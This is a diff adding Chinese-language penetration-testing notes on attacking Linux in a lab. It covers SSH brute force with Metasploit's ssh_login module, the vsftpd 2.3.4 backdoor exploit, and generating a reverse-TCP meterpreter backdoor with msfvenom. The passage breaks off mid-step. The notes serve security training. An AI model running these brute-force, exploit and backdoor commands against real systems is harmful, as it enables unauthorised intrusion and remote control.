@@ -434,3 +434,99 @@ hostname
 WIN-5MQI51VLCDC
 ```
 
+# 对Linux的渗透
+## ssh
+- SSH是基于应用层的安全协议
+- SSH是专为远程登陆和其他网络服务提供安全性的协议
+- SSH提供基于密码、基于密钥的两种级别的安全验证
+- SSH传输的数据会进行加密，可以有效防止远程过程中的信息泄露问题
+- SSH传输的数据时会进行数据压缩，可以加快传输的速度
+### SSH暴力破解工具
+- Hydra、Medusa、msf
+- 大部分攻击都是针对Linux服务器默认管理账号root，攻击者主要使用admin、root、123456等常见弱密码进行暴力破解
+- 少部分攻击是针对Linux服务器上常见应用程序使用的用户名
+- 攻击者不仅使用常见通用弱密码，还会将用户名当最密码进行攻击
+### SSH爆破
+#### 创建字典
+- 手写一个简单的字典，或者从网上白嫖
+```
+vim /root/passwd              //创建一个实验用的密码本
+```
+#### 查找MSF辅助爆破脚本
+```
+┌──(root㉿kali)-[~]
+└─# msfconsole -q                 //进入MSF控制台
+msf6 > search ssh_login         //搜索ssh登录相关程序相关脚本
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
+   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey                                          
+```
+#### 使用辅助脚本进行SSH爆破
+```
+msf6> use 0
+set username msfadmin         //设置用户名
+set pass_file /root/passwd      //设置密码本
+set rhosts 192.168.10.143       //设置攻击目标
+```
+#### 查看会话、切换会话
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions //显示所有会话
+
+Active sessions
+===============
+
+  Id  Name  Type         Information  Connection
+  --  ----  ----         -----------  ----------
+  1         shell linux  SSH root @   192.168.10.224:43951 -> 192.168.10.14
+                                      3:22 (192.168.10.143)
+
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions 1  //切换到会话1
+[*] Starting interaction with 1...
+whoami
+```
+## Exploit漏洞利用
+### 漏洞利用VSFTPD
+- vsftpd_234_backdoor（笑脸漏洞），允许攻击者任意用户登录，以root权限执行任意命令
+  - 用户名以“笑脸”结尾，如xx:)、oo:)
+  - 密码任意输入
+  - 成功后开启6200端口，执行任意命令
+```
+msf6> search vsftpd
+msf6> use 0
+> set rhosts 192.168.10.143
+> run
+…………
+whoami
+ifconfig
+```
+
+## Linux后门
+### Msfvenom后门（毒液）
+#### 什么是Msfvenom
+  - Msfvenom
+    - Msfvenom是MSF框架配套的攻击载荷生成器
+    - 可以用来生成木马程序，并在目标机上执行，在本地监听上线
+  - 部分参数
+    - -p：选择一个载荷
+    - -f：生成的文件格式，elf(Linux下执行文件)exe（Windows下执行）
+    - -l：host监听地址
+    - -l：port监听端口
+    - -o：输出文件名
+    - -h：帮助
+#### Msfvenom生成后门文件
+  - 第一步：在kali生成后门文件
+  ```
+  ┌──(root㉿kali)-[~]
+  └─# msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.10.224 lport=4444 -f elf -o shell
+
+  ```
+  - 第二步：确保开启linux靶机的root用户，并设置密码root（可以爆破以更改）
+  - 第三步：
